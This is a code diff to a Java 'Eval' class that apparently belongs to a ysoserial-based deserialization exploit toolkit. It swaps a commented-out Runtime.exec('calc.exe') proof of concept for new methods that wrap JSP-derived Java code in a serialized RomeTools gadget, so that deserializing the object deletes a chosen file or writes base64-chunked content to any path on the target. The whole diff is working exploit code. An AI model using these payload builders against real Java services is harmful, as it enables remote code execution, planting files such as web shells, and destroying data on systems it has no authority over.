@@ -4,6 +4,8 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import ysoserial.Deserializer;
 import ysoserial.Serializer;
+import ysoserial.payloads.util.Encoder;
+import ysoserial.payloads.util.ReadWrite;
 
 import java.util.Base64;
 import java.util.regex.Matcher;
@@ -11,12 +13,48 @@ import java.util.regex.Pattern;
 
 public class Eval {
     public static void main(String[] args) throws Exception{
-        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
-        Object o = new Eval().getObject(RomeTools.class,code);
-//        Object o = new Eval().getObject(RomeTools.class, Fuck.class);
+//        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
+//        Object o = new Eval().getObject(RomeTools.class,code);
+        Object o = new Eval().uploadFile(RomeTools.class,"/tmp/1.txt","/tmp/3.txt");
         byte[] ser = Serializer.serialize(o);
 
         Deserializer.deserialize(ser);
+    }
+
+    public Object deleteFile(Class gadget,String path) throws Exception{
+        String code = new String(ReadWrite.readResource(Eval.class,"eval/delete_file.jsp"));
+        code = code.replace("%path%",path);
+        code = getJavaCodeFromJSP(code);
+        return getObject(gadget,code);
+    }
+
+    public Object uploadFile(Class gadget,String souce, String destination) throws Exception{
+        byte[] content = ReadWrite.readFile(souce);
+        return uploadFile(gadget,content,destination);
+    }
+    public Object uploadFile(Class gadget,byte[] content, String destination) throws Exception{
+        String b64 = Encoder.base64_encode(content);
+        String code = new String(ReadWrite.readResource(Eval.class,"eval/write_file.jsp"));
+
+        int i = 0;
+        long l = b64.length();
+
+        StringBuilder sb = new StringBuilder();
+
+        sb.append("String b[] = new String[]{\n");
+
+        while (i + 0xc000 < l){
+            sb.append("\"" + b64.substring(i,i + 0xc000) + "\",");
+            i += 0xc000;
+        }
+        sb.append("\"" + b64.substring(i,b64.length()) + "\",\n};\n");
+
+        sb.append("String b64 = String.join(\"\",b);\n");
+        b64 = sb.toString();
+
+        code = code.replace("String b64 = \"%b64%\";",b64).replace("%destination%",destination);
+        code = getJavaCodeFromJSP(code);
+        return getObject(gadget,code);
     }
     public Object getObject(Class gadget,String code) throws Exception {
         ClassPool pool = ClassPool.getDefault();
